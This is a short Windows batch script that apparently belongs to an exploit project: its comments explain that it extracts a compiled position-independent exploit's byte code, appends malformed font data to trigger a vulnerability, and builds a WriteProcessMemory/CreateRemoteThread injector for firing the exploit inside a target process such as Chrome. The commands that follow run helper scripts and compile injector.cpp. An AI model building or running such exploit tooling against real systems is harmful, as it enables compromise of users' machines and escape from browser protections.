@echo off

REM This script will run a helper script, make-raw-bytes.py, to extract
REM the code section of the compiled (position-independent) exploit, and
REM append the necessary malformed font data to it, so that the exploit can
REM access it when triggering the vulnerability. We refer to this as the
REM exploit's raw byte code.
REM
REM With that, make-injector-cpp.py will then generate an injector.cpp file
REM that injects the exploit's raw byte code into an arbitrary process. This
REM is a standard WriteProcessMemory() and CreateRemoteThread() injector
REM that can be used to inject and trigger the exploit in a target (e.g. Chrome).
REM
REM NOTE.
REM This requires Visual Studio 2013 Express to be installed.
REM

echo.
echo Extracting exploit raw byte code and generating compiled injector.
echo To use, run injector.exe ^<PID^>.
echo.

python make-raw-bytes.py
python make-injector-cpp.py
"C:\Program Files (x86)\Microsoft Visual Studio 12.0\VC\vcvarsall.bat" x86_amd64 && cl injector.cpp
